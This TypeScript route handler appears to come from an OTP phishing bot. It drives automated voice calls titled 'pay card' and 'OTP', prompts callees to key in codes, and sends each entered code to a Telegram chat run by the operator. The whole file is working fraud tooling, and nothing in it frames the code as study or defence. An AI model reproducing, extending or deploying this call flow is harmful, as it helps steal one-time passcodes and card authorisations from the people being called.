import { bot } from '../..';
import { app } from '../';
import { v4 as uuidv4 } from 'uuid';
import { getLangCustom } from '../../languages';
import { Language } from '../../types';

app.all('/custom/:step/:chatId/:language', async (req, res) => {
  const { actions, action } = req.query;
  const { variables } = req.query;
  const { dtmf } = JSON.parse(variables as string);

  const { language, chatId, step } = req.params;

  const ac: {
    0: string;
    1: string;
  }[] = JSON.parse(String(actions));

  if (!dtmf) {
    return res.json({
      id: uuidv4(),
      title: `pay card - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangCustom({
              action: ac[0][1],
              step: `1`,
              language: language as Language,
            }),
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: 'customStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${
              process.env.ENDPOINT_URL
            }/custom/${step}/${chatId}/${language}?actions=${JSON.stringify(
              ac.splice(1, 2),
            )}&action=${ac[0][0]}`,
          },
        },
      ],
    });
  }

  if (dtmf) {
    await bot.telegram.sendMessage(chatId, `${action} <b>${dtmf}</b> 👻`, {
      parse_mode: 'HTML',
    });
  }

  if (ac.length) {
    return res.json({
      id: uuidv4(),
      title: `custom - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangCustom({
              action: ac[0][1],
              dtmf: dtmf.split('').join(', '),
              step: `2`,
              language: language as Language,
            }),
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'customStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 20,
        },
        {
          id: 'customStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${
              process.env.ENDPOINT_URL
            }/custom/${step}/${chatId}/${language}?actions=${JSON.stringify(
              ac.splice(1, 2),
            )}&action=${ac[0][0]}`,
          },
        },
      ],
    });
  }

  return res.json({
    id: uuidv4(),
    title: `call custom - ${chatId}`,
    record: false,
    steps: [
      {
        id: uuidv4(),
        action: 'say',
        options: {
          payload: getLangCustom({
            dtmf: dtmf.split('').join(', '),
            step: `3`,
            language: language as Language,
          }),
          language,
          voice: 'female',
        },
      },
    ],
  });
});
